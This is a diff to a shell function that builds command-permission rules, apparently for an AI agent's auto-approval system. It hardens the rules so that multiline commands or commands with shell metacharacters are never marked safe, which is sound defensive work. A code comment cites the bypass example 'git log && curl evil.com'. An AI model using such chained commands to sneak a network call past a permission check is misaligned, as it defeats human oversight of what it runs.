@@ -191,6 +191,28 @@ build_rule_v2() {
 			local first_line
 			first_line="${cmd%%$'\n'*}"
 
+			# SEC-08: Multiline commands are never safe (second+ lines
+			# could contain arbitrary code invisible to the classifier)
+			local is_multiline=0
+			if [[ $cmd == *$'\n'* ]]; then
+				is_multiline=1
+			fi
+
+			# SEC-01: Commands with shell metacharacters are never safe
+			# (e.g. "git log && curl evil.com" would bypass safe classification)
+			local has_metachar=0
+			case "$first_line" in
+			*'&&'* | *'||'* | *'|'* | *';'*)
+				has_metachar=1
+				;;
+			esac
+			# shellcheck disable=SC2016
+			case "$first_line" in
+			*'`'* | *'$('* | *'>('* | *'<('*)
+				has_metachar=1
+				;;
+			esac
+
 			# Peel indirection wrappers
 			peel_indirection "$first_line"
 			local effective="${PEELED_COMMAND}"
@@ -248,7 +270,9 @@ build_rule_v2() {
 			if has_subcommands "$binary" && [[ -n $subcommand ]]; then
 				RULE="Bash(${binary} ${subcommand} *)"
 				BASE_COMMAND="${binary} ${subcommand}"
-				if is_safe_subcommand "$binary" "$subcommand"; then
+				# Only mark safe if no metacharacters and not multiline
+				if [[ $has_metachar -eq 0 ]] && [[ $is_multiline -eq 0 ]] &&
+					is_safe_subcommand "$binary" "$subcommand"; then
 					IS_SAFE="true"
 				fi
 			elif [[ -n $binary ]]; then
